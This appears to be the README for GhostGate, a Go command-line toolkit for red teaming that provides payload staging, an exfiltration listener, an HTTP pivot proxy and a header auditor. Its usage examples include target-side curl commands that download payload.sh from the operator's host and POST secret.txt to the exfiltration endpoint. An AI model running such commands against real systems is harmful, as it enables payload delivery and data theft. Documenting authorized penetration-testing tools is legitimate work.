# GhostGate

> A versatile Go-based networking toolkit designed for penetration testing, red teaming, and security auditing.

GhostGate simplifies the process of setting up payload staging environments, running data exfiltration handlers, establishing reverse/pivot tunnels, and conducting HTTP security configuration audits — all from a single, unified CLI.

---

## Features

| Feature | Subcommand | Description |
|---|---|---|
| **Payload Staging** | `stage` | Host a local directory over HTTP/S for remote payload delivery |
| **Exfiltration Listener** | `upload` | Accept raw binary or text files from target machines via HTTP POST |
| **Pivot Tunnel** | `tunnel` | HTTP reverse proxy that routes incoming traffic to a designated target |
| **Config Auditor** | `audit` | Inspect response headers, status codes, and body structure of a target URL |
| **Config Initializer** | `init` | Generate a persistent JSON configuration file with interactive or default values |
| **TLS Support** | *(global)* | Optionally enable HTTPS on any server command using your own cert/key files |
| **Input Sanitization** | *(global)* | Automatic cleaning and validation of all ports, URLs, and file paths |

---

## Requirements

- [Go](https://golang.org/dl/) **1.22+**

---

## Installation

1. **Clone the repository:**
```bash
git clone https://github.com/yourusername/GhostGate.git
cd GhostGate
```

2. **Install dependencies:**
```bash
go mod download
```

3. **Build the binary (optional):**
```bash
go build -o ghostgate .
```

4. **Initialize the configuration file:**
```bash
go run main.go init
```

> This generates a `config.json` in your system config directory (`~/.config/GhostGate/`) with preset defaults. If no config file is found at runtime, built-in defaults are used automatically.

---

## Configuration

Configuration is managed via [Viper](https://github.com/spf13/viper) and stored as a JSON file at:

- **macOS / Linux:** `~/.config/GhostGate/config.json`

| Key | Default | Description |
|---|---|---|
| `default_port` | `8080` | Port used when `-p` is not specified |
| `default_payloads_directory` | `payloads` | Directory served by the `stage` command |
| `default_uploads_directory` | `uploads` | Destination directory for the `upload` command |
| `default_url_path` | `/uploads` | URI endpoint for the `upload` command |
| `default_tls_enabled` | `false` | Whether TLS is enabled by default |
| `default_tls_cert_file` | *(empty)* | Path to a default TLS certificate file |
| `default_tls_key_file` | *(empty)* | Path to a default TLS key file |

---

## Global Flags

These flags are available on **every** subcommand:

| Flag | Short | Default | Description |
|---|---|---|---|
| `--port` | `-p` | `8080` | Port to run the service on |
| `--tls` | `-e` | `false` | Enable TLS (HTTPS) for the server |
| `--cert-file` | `-c` | *(empty)* | Path to the TLS certificate file |
| `--key-file` | `-k` | *(empty)* | Path to the TLS private key file |
| `--target` | `-t` | *(empty)* | Target URL (used by `audit` and `tunnel`) |

---

## Usage

GhostGate uses a subcommand-based CLI architecture built on [Cobra](https://github.com/spf13/cobra).

### 1. Payload Staging (`stage`)

Serves a local directory over HTTP (or HTTPS) so remote machines can pull payloads, tools, or scripts.

```bash
go run main.go stage -p <port> -d <staging_directory> [-s <source_directory>] [-e] [-c <cert>] [-k <key>]
```

| Flag | Short | Default | Description |
|---|---|---|---|
| `--port` | `-p` | `8080` | Port to host the staging server on |
| `--directory` | `-d` | `payloads` | Directory to serve files from |
| `--source` | `-s` | *(optional)* | Local source directory to copy tools/payloads from before serving |

**Examples:**

```bash
# Serve the default payloads directory on port 9000
go run main.go stage -p 9000

# Copy tools from /opt/tools into the staging dir, then serve
go run main.go stage -p 8080 -d payloads -s /opt/tools

# Serve over HTTPS with your own certificate
go run main.go stage -p 443 -e -c ./cert.pem -k ./key.pem
```

**Downloading from a target machine:**
```bash
curl http://<GhostGate_IP>:<Port>/payload.sh -o payload.sh
```

---

### 2. Data Exfiltration Listener (`upload`)

Starts an HTTP server with a POST endpoint to receive files exfiltrated from target machines. Files are saved to the configured destination directory.

```bash
go run main.go upload -p <port> -u <endpoint_path> -d <destination_directory> [-e] [-c <cert>] [-k <key>]
```

| Flag | Short | Default | Description |
|---|---|---|---|
| `--port` | `-p` | `8080` | Port to bind the exfiltration listener to |
| `--url-path` | `-u` | `/uploads` | URI endpoint that accepts file uploads |
| `--destination` | `-d` | `uploads` | Local directory to store received files |

**Examples:**

```bash
# Start a listener on port 4444 at /exfil, saving to ./loot
go run main.go upload -p 4444 -u /exfil -d ./loot

# Start an HTTPS listener
go run main.go upload -p 443 -e -c cert.pem -k key.pem
```

**Sending a file from a target machine:**
```bash
# The X-File-Name header sets the saved filename on the listener
curl -X POST \
  --data-binary @secret.txt \
  -H 'X-File-Name: secret.txt' \
  http://<GhostGate_IP>:<Port>/uploads
```

---

### 3. Pivot Tunnel Server (`tunnel`)

Operates as an HTTP reverse proxy: incoming requests to GhostGate's local port are forwarded transparently to the specified target URL, and responses are relayed back to the caller.

```bash
go run main.go tunnel -p <local_port> -t <target_url> [-e] [-c <cert>] [-k <key>]
```

| Flag | Short | Default | Description |
|---|---|---|---|
| `--port` | `-p` | `8080` | Local port to host the tunnelling endpoint on |
| `--target` | `-t` | *(required)* | Target URL to proxy requests to |

**Examples:**

```bash
# Pivot traffic through port 8080 to an internal target
go run main.go tunnel -p 8080 -t http://192.168.1.50:80

# Pivot via HTTPS
go run main.go tunnel -p 443 -t http://internal.host -e -c cert.pem -k key.pem
```

**Interacting with the tunnel:**
```bash
curl -X GET http://<GhostGate_IP>:<Local_Port>/<path>
```

---

### 4. Configuration Auditor (`audit`)

Sends an HTTP GET request to the target URL and outputs a colour-coded breakdown of:

- **Protocol & Status** — green (2xx), yellow (3xx), red (4xx/5xx)
- **Response Headers** — all headers listed
- **Response Body** — auto-formatted as pretty-printed JSON, indented HTML, or plain text

```bash
go run main.go audit -t <target_url>
```

| Flag | Short | Default | Description |
|---|---|---|---|
| `--target` | `-t` | *(required)* | The target URL to audit |

**Examples:**

```bash
go run main.go audit -t https://example.com
go run main.go audit -t http://192.168.1.1:8080/api/status
```

---

### 5. Configuration Initializer (`init`)

Generates a JSON configuration file. Prompts for custom values interactively, or writes built-in defaults.

```bash
go run main.go init
```

---

## Project Structure

```text
GhostGate/
├── cmd/                    # CLI command definitions (Cobra)
│   ├── root.go             # Root command, global flags, and config bootstrap
│   ├── stage.go            # 'stage' subcommand
│   ├── upload.go           # 'upload' subcommand
│   ├── tunnel.go           # 'tunnel' subcommand
│   ├── audit.go            # 'audit' subcommand
│   └── init.go             # 'init' subcommand
├── config/                 # Configuration loading and initialization (Viper)
│   ├── config.go           # Config struct and LoadConfig()
│   └── init.go             # Interactive config file generation
├── internal/
│   ├── commands/           # Business logic for each subcommand
│   │   ├── stage.go        # Payload staging server
│   │   ├── upload.go       # File exfiltration server
│   │   ├── tunnel.go       # HTTP reverse proxy
│   │   ├── audit.go        # Header/body auditor with colour output
│   │   └── tls.go          # Shared TLS helpers
│   ├── input/              # Input sanitization: ports, URLs, file paths
│   ├── logger/             # Structured logging
│   ├── networking/         # Network helpers (TLS, cert generation, IPs)
│   └── util/               # File system helpers and general utilities
├── scripts/                # Validation and testing scripts
├── go.mod
├── go.sum
└── main.go                 # Entry point
```

---

## Dependencies

| Package | Purpose |
|---|---|
| [`spf13/cobra`](https://github.com/spf13/cobra) | CLI subcommand framework |
| [`spf13/viper`](https://github.com/spf13/viper) | Configuration file management |
| [`golang.org/x/net`](https://pkg.go.dev/golang.org/x/net) | HTML tokenizer (audit body formatting) |

---

## License

This project is licensed under the **MIT License** — see [LICENSE](./LICENSE) for details.

---

## Disclaimer

> **Notice:** GhostGate is created solely for **authorized** security assessments, educational exercises, and defensive auditing. Do **not** use this tool against infrastructure you do not explicitly own or have written authorization to test. The author assumes no liability for misuse.